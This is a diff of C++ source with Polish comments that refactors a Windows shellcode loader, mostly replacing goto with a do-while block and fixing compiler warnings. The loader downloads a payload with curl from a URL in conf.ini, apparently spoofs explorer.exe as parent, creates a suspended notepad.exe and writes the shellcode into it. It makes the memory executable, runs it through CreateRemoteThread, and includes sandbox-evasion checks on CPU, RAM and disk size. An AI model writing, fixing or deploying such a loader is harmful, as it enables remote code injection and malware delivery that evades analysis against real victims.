@@ -27,7 +27,7 @@ int main(int argc, char* argv[])
 
     // ---------- Przygotowanie komendy curl ----------
     std::string command = "curl \"" + payloadUrl + "\"";
-    
+
     FILE* fpipe;
     std::vector<char> shellcode;
     char buffer[4096];
@@ -60,9 +60,7 @@ int main(int argc, char* argv[])
 
     printf("\n\nPayload downloaded successfully. Size: %zu bytes\n", shellcode.size());
 
-    // ---------- Reszta kodu (procesy, wstrzykiwanie) ----------
-    // ... (bez zmian w stosunku do poprzedniej wersji) ...
-    
+    // ---------- Pobranie procesu explorer.exe ----------
     DWORD runningProcessesIDs[1024];
     DWORD runningProcessesCountBytes;
     DWORD runningProcessesCount;
@@ -71,11 +69,11 @@ int main(int argc, char* argv[])
     EnumProcesses(runningProcessesIDs, sizeof(runningProcessesIDs), &runningProcessesCountBytes);
     runningProcessesCount = runningProcessesCountBytes / sizeof(DWORD);
 
-    for (int i = 0; i < runningProcessesCount; i++) {
+    for (DWORD i = 0; i < runningProcessesCount; i++) {  // warning C4018: zmiana int -> DWORD
         if (runningProcessesIDs[i] != 0) {
             HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, runningProcessesIDs[i]);
             if (!hProcess) continue;
-            
+
             char processName[MAX_PATH + 1];
             DWORD size = GetModuleFileNameExA(hProcess, 0, processName, MAX_PATH);
             if (size == 0) {
@@ -87,7 +85,8 @@ int main(int argc, char* argv[])
             if (strstr(processName, "explorer.exe") && hProcess) {
                 if (hExplorerexe) CloseHandle(hExplorerexe);
                 hExplorerexe = hProcess;
-            } else {
+            }
+            else {
                 CloseHandle(hProcess);
             }
         }
@@ -97,16 +96,20 @@ int main(int argc, char* argv[])
     // bool checkStatus = dynamicAnalysisCheck();
     // if (IsDebuggerPresent() && !checkStatus) { ... }
 
-    {
-        STARTUPINFOEXA si;
-        PROCESS_INFORMATION pi;
-        SIZE_T attributeSize;
-        int exitCode = 1;
-        void* exec = NULL;
-        HANDLE hThread = NULL;
+    // ---------- Blok wykonawczy z czyszczeniem (zastąpienie goto) ----------
+    int exitCode = 1;
+    HANDLE hThread = NULL;
+    void* exec = NULL;
+    PROCESS_INFORMATION pi = { 0 };
+    STARTUPINFOEXA si = { 0 };
+    SIZE_T payloadSize = 0;          // deklaracja przed możliwymi skokami
+    DWORD oldProtect = 0;            // deklaracja przed możliwymi skokami
+
+    do {
         RtlZeroMemory(&si, sizeof(STARTUPINFOEXA));
         RtlZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
 
+        SIZE_T attributeSize;
         InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
         si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)new byte[attributeSize]();
         InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
@@ -116,60 +119,58 @@ int main(int argc, char* argv[])
         si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
 
         if (!CreateProcessA("C:\\Windows\\notepad.exe", NULL, NULL, NULL, FALSE,
-                            EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, NULL,
-                            &si.StartupInfo, &pi)) {
+            EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, NULL,
+            &si.StartupInfo, &pi)) {
             printf("Failed to create process. Error: %d\n", GetLastError());
-            goto process_cleanup;
+            break;  // zamiast goto
         }
 
         printf("Process created with PID: %d\n", pi.dwProcessId);
 
-        const SIZE_T payloadSize = shellcode.size();
+        payloadSize = shellcode.size();   // inicjalizacja w bezpiecznym miejscu
         exec = VirtualAllocEx(pi.hProcess, 0, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if (!exec) {
             printf("VirtualAllocEx failed. Error: %d\n", GetLastError());
-            goto process_cleanup;
+            break;
         }
 
         SIZE_T written;
         if (!WriteProcessMemory(pi.hProcess, exec, shellcode.data(), payloadSize, &written) || written != payloadSize) {
             printf("WriteProcessMemory failed. Error: %d\n", GetLastError());
-            goto process_cleanup;
+            break;
         }
 
-        DWORD oldProtect = 0;
         if (!VirtualProtectEx(pi.hProcess, exec, payloadSize, PAGE_EXECUTE_READ, &oldProtect)) {
             printf("VirtualProtectEx failed. Error: %d\n", GetLastError());
-            goto process_cleanup;
+            break;
         }
 
         hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
         if (!hThread) {
             printf("CreateRemoteThread failed. Error: %d\n", GetLastError());
-            goto process_cleanup;
+            break;
         }
 
         if (ResumeThread(pi.hThread) == (DWORD)-1) {
             printf("ResumeThread failed. Error: %d\n", GetLastError());
-            goto process_cleanup;
+            break;
         }
 
-        exitCode = 0;
+        exitCode = 0;   // sukces
+    } while (0);
 
-    process_cleanup:
-        if (hThread) CloseHandle(hThread);
-        if (exec && pi.hProcess) VirtualFreeEx(pi.hProcess, exec, 0, MEM_RELEASE);
-        if (pi.hProcess) CloseHandle(pi.hProcess);
-        if (pi.hThread) CloseHandle(pi.hThread);
-        if (si.lpAttributeList) {
-            DeleteProcThreadAttributeList(si.lpAttributeList);
-            delete[] reinterpret_cast<byte*>(si.lpAttributeList);
-        }
-        if (hExplorerexe) CloseHandle(hExplorerexe);
-        return exitCode;
+    // ---------- Czyszczenie (odpowiednik process_cleanup) ----------
+    if (hThread) CloseHandle(hThread);
+    if (exec && pi.hProcess) VirtualFreeEx(pi.hProcess, exec, 0, MEM_RELEASE);
+    if (pi.hProcess) CloseHandle(pi.hProcess);
+    if (pi.hThread) CloseHandle(pi.hThread);
+    if (si.lpAttributeList) {
+        DeleteProcThreadAttributeList(si.lpAttributeList);
+        delete[] reinterpret_cast<byte*>(si.lpAttributeList);
     }
+    if (hExplorerexe) CloseHandle(hExplorerexe);
 
-    return 0;
+    return exitCode;
 }
 
 // ---------- Funkcja pobierająca URL ----------
@@ -189,12 +190,13 @@ std::string GetConfigUrl(int argc, char* argv[])
     size_t lastSlash = iniPath.find_last_of("\\/");
     if (lastSlash != std::string::npos) {
         iniPath = iniPath.substr(0, lastSlash + 1);
-    } else {
+    }
+    else {
         iniPath = "";
     }
     iniPath += "conf.ini";
 
-    char urlBuffer[1024] = {0};
+    char urlBuffer[1024] = { 0 };
     DWORD result = GetPrivateProfileStringA(
         "Main",           // sekcja
         "PayloadURL",     // klucz
@@ -212,9 +214,8 @@ std::string GetConfigUrl(int argc, char* argv[])
     return fallbackUrl;
 }
 
-// ---------- dynamicAnalysisCheck (bez zmian) ----------
+// ---------- dynamicAnalysisCheck (poprawione ostrzeżenie C4244) ----------
 bool dynamicAnalysisCheck() {
-    // ... kod niezmieniony ...
     SYSTEM_INFO systemInfo;
     GetSystemInfo(&systemInfo);
     DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
@@ -223,7 +224,7 @@ bool dynamicAnalysisCheck() {
     MEMORYSTATUSEX memoryStatus;
     memoryStatus.dwLength = sizeof(memoryStatus);
     GlobalMemoryStatusEx(&memoryStatus);
-    DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
+    DWORD RAMMB = static_cast<DWORD>(memoryStatus.ullTotalPhys / 1024 / 1024);
     if (RAMMB < 2048) return false;
 
     HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
@@ -235,8 +236,10 @@ bool dynamicAnalysisCheck() {
         return false;
     }
     CloseHandle(hDevice);
-    DWORD diskSizeGB;
-    diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
+    DWORD diskSizeGB = static_cast<DWORD>(
+        pDiskGeometry.Cylinders.QuadPart * pDiskGeometry.TracksPerCylinder *
+        pDiskGeometry.SectorsPerTrack * pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024
+        );
     if (diskSizeGB < 100) return false;
 
     WIN32_FIND_DATAW findFileData;
